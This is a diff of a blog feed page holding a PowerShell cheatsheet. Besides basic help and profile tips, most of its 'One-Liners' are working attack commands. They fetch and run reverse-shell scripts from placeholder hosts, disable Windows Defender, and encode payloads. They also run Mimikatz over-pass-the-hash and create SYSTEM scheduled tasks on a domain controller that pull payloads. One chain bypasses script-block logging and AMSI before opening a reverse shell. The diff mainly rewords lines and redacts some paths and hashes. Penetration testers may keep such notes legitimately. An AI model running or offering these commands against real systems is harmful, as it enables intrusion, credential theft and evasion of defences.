@@ -17,7 +17,7 @@
             <guid>https://tribalknowledge.page/posts/2021/10/powershell-cheatsheet/</guid>
             <description>This cheatsheet will continue to receive updates.
 PowerShell (PS) 101 commands  Please note that all of the following commands are run from a PowerShell prompt.
-Retrieve the PowerShell Version
+Retrieve the PowerShell version
 $PSVersionTable List help about a cmdlet in a readable format
 Get-Help &amp;lt;cmdlet&amp;gt; | more List cmdlets which contain the keyword &amp;lsquo;service&amp;rsquo; in them
 Get-Command -CommandType Cmdlet | ?{$_.Name -match &amp;#34;service&amp;#34;} List available commands in the current PS session and their respective details which contain the keyword &amp;lsquo;command&amp;rsquo; in them:</description>
@@ -25,7 +25,7 @@ Get-Command -CommandType Cmdlet | ?{$_.Name -match &amp;#34;service&amp;#34;} Li
 <h2 id="powershell-ps-101-commands">PowerShell (PS) 101 commands</h2>
 <hr>
 <p>Please note that all of the following commands are run from a PowerShell prompt.</p>
-<p>Retrieve the PowerShell Version</p>
+<p>Retrieve the PowerShell version</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"> $PSVersionTable 
 </code></pre></div><p>List help about a cmdlet in a readable format</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Help &lt;cmdlet&gt; | more
@@ -39,11 +39,11 @@ Get-Command -CommandType Cmdlet | ?{$_.Name -match &amp;#34;service&amp;#34;} Li
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(Get-Command -CommandType All | ?{$_.Name <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;command&#34;</span>}).count
 </code></pre></div><p>List all cmdlets with PKI as source</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -CommandType Cmdlet | ?{$_.Source <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;PKI&#34;</span>}
-</code></pre></div><p>List all commands in a module by running</p>
+</code></pre></div><p>List available commands in a module by running</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-Command -Module &lt;module name&gt;
 </code></pre></div><h2 id="handy-tweaks">Handy Tweaks</h2>
 <hr>
-<p>When you launch PowerShell session, it opens in the user&rsquo;s home directory by default. This behavior can be modified so that new PS sessions open in your custom directory. Here is how:</p>
+<p>When you launch PowerShell session, it opens in the user&rsquo;s home directory by default. This behavior can be modified so that new PS sessions open in a custom directory. Here is how:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Check the value of $PROFILE variable.</span>
 
 PS C:\Windows\system32&gt; $PROFILE
@@ -55,10 +55,10 @@ PS C:\Windows\system32&gt; New-Item -Path $PROFILE -Type File -Force
 
 <span style="color:#75715e"># To set and change the default working directory, open the above &#39;Microsoft.PowerShell_profile.ps1&#39; in ISE and add the following line with your desired path.</span>
 
-Set-location &lt;Desired Path&gt;
+Set-location &lt;Custom directory path&gt;
 </code></pre></div><h2 id="one-liners">One-Liners</h2>
 <hr>
-<h3 id="creating-a-firewall-rule-exception-in-windows">Creating a firewall rule exception in Windows:</h3>
+<h3 id="creating-a-firewall-rule-exception-in-windows">Creating a firewall rule exception in Windows</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">New-NetFirewallRule -DisplayName <span style="color:#e6db74">&#39;HTTP-Inbound&#39;</span> -Profile @(<span style="color:#e6db74">&#39;Domain&#39;</span>, <span style="color:#e6db74">&#39;Private&#39;</span>) -Direction Inbound -Action Allow -Protocol TCP -LocalPort @(<span style="color:#e6db74">&#39;80&#39;</span>, <span style="color:#e6db74">&#39;443&#39;</span>)
 
 New-NetFirewallRule -DisplayName <span style="color:#e6db74">&#39;447-Inbound&#39;</span> -Profile @(<span style="color:#e6db74">&#39;Domain&#39;</span>, <span style="color:#e6db74">&#39;Private&#39;</span>) -Direction Inbound -Action Allow -Protocol TCP -LocalPort @(<span style="color:#e6db74">&#39;447&#39;</span>)
@@ -72,15 +72,20 @@ powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6d
 iwr -UseBasicparsing http<span style="color:#960050;background-color:#1e0010">:</span>//192.168.X.X/Invoke-PowerShellRev.ps1 | iex
 </code></pre></div><h3 id="creating-a-credential-object">Creating a Credential object</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;XXXXXXXXXXXX&#39;</span> -AsPlainText -Force
+
 $Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;domain\user&#39;</span>, $SecPassword)
+
 </code></pre></div><h3 id="decode-base64">Decode Base64</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$EncodedText = <span style="color:#960050;background-color:#1e0010">“</span>VABoA....<span style="color:#960050;background-color:#1e0010">”</span>
+
 $DecodedText = <span style="color:#66d9ef">[System.Text.Encoding]</span>::Unicode.GetString(<span style="color:#66d9ef">[System.Convert]</span>::FromBase64String($EncodedText))
+
 $DecodedText
 </code></pre></div><h3 id="disable-av">Disable AV</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-MpPreference -DisableRealtimeMonitoring $true
+
 Set-MpPreference -DisableIOAVProtection $true
-</code></pre></div><h3 id="encode-reverse-shell">Encode Reverse Shell</h3>
+</code></pre></div><h3 id="encode-reverse-shell">Encode reverse shell</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">. .\Invoke-Encode.ps1
 
 Invoke-Encode -DataToEncode .\Invoke-PowerShellTcpOneLine.ps1 -OutCommand
@@ -92,7 +97,7 @@ powershell -e &lt;content of encodedcommand.txt&gt;
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Create reverse.bat file</span>
 
 $Contents = <span style="color:#e6db74">&#39;powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(&#39;&#39;http://192.168.X.X/Invoke-PowerShellRev8080.ps1&#39;&#39;))&#39;</span>
-Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\RTL\Tools\reverse8080.bat
+Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\...\Tools\reverse8080.bat
 
 <span style="color:#75715e"># Call reverse.bat file</span>
 
@@ -100,19 +105,19 @@ Out-File -Encoding Ascii -InputObject $Contents -FilePath C:\RTL\Tools\reverse80
 .rotten.exe * reverse.bat
 
 <span style="color:#75715e">## Option 2</span>
-Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:NTLMHASH /run:C:\users\appadmin\desktop\reverse.bat&#34;&#39;</span>
+Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:&lt;NTLMHASH&gt; /run:C:\users\.....\desktop\reverse.bat&#34;&#39;</span>
 </code></pre></div><h3 id="scheduled-tasks">Scheduled tasks</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">schtasks /create /S dc.contoso.local /SC Weekly /RU <span style="color:#e6db74">&#34;NT Authority\SYSTEM&#34;</span> /TN <span style="color:#e6db74">&#34;UserX&#34;</span> /TR <span style="color:#e6db74">&#34;powershell.exe -c &#39;iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://172.16.X.X/Invoke-PowerShellRev8080.ps1&#39;&#39;&#39;)&#39;&#34;</span>
 
 schtasks /Run /S dc.contoso.local /TN <span style="color:#e6db74">&#34;UserX&#34;</span>
 </code></pre></div><h3 id="invoke-wmimethod---command-execution-reverse-shell-etc">Invoke-WMIMethod - Command Execution (Reverse shell, etc.)</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-WmiMethod win32_process -ComputerName dc.contoso.local -name create -argumentlist <span style="color:#e6db74">&#34;powershell.exe -e $encodedCommand&#34;</span>
-</code></pre></div><h3 id="chain-powershell-commands-to-bypass-sblogging-then-amsibypass-and-then-get-reverse-shell">Chain powershell commands to Bypass SBLogging, then AMSIBypass and then get reverse-shell</h3>
+</code></pre></div><h3 id="chain-powershell-commands-to-bypass-sblogging-then-amsibypass-and-then-get-reverse-shell">Chain powershell commands to Bypass SBLogging, then AMSIBypass and then get reverse shell</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -c <span style="color:#e6db74">&#34;iex (iwr -UseBasicParsing http://192.168.X.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.X.X/Invoke-PowerShellTcpEx.ps1)
 </span></code></pre></div><h3 id="check-local-admin-access-via-invoke-command">Check local admin access via Invoke-Command</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName (Get-Content ..\Output\computers.txt) 2&gt;$null
 </code></pre></div><h3 id="over-pass-the-hash">Over pass-the-hash</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:NTLMHASH /run:powershell.exe&#34;&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;sekurlsa::pth /user:username /domain:srv.contoso.local /ntlm:&lt;NTLMHASH&gt; /run:powershell.exe&#34;&#39;</span>
 </code></pre></div><h2 id="playing-with-command-output">Playing with command output</h2>
 <hr>
 <h3 id="1-expand-redacted-output">1. Expand redacted output</h3>
